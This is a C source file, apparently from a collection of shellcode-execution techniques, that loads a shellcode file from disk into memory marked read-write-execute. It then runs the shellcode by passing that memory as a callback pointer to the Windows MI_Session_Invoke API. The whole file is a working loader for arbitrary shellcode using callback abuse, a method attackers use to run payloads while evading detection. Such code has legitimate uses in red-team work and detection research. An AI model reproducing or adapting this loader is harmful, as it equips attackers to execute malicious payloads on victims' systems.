// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Mi.lib")

#include <stdio.h>
#include <windows.h>
#include <mi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: MI_Session_Invoke.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);
	
	MI_Application sMIApp = { 0 };
	MI_Session sMISess = { 0 };
	MI_Operation sMIOp = { 0 };

	MI_OperationCallbacks sMIOpCallbacks = { 0 };
	sMIOpCallbacks.promptUser = NULL;
	sMIOpCallbacks.writeError = NULL;
	sMIOpCallbacks.writeMessage = NULL;
	sMIOpCallbacks.writeProgress = NULL;
	sMIOpCallbacks.instanceResult = hAlloc;
	sMIOpCallbacks.indicationResult = NULL;
	sMIOpCallbacks.classResult = NULL;
	sMIOpCallbacks.streamedParameterResult = NULL;

	MI_Application_InitializeV1(0, NULL, NULL, &sMIApp);

	MI_Application_NewSession(&sMIApp, NULL, NULL, NULL,
		NULL, NULL, &sMISess);

	MI_Session_Invoke(
		&sMISess,
		MI_OPERATIONFLAGS_DEFAULT_RTTI,
		NULL, NULL, NULL,
		NULL, //Specifying NULL here works for triggering large shellcode. Adding a method name still works for small shellcode.
		NULL, NULL,
		&sMIOpCallbacks,
		&sMIOp);

	MI_Operation_Close(&sMIOp);

	MI_Session_Close(&sMISess, NULL, NULL);

	MI_Application_Close(&sMIApp);
	
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}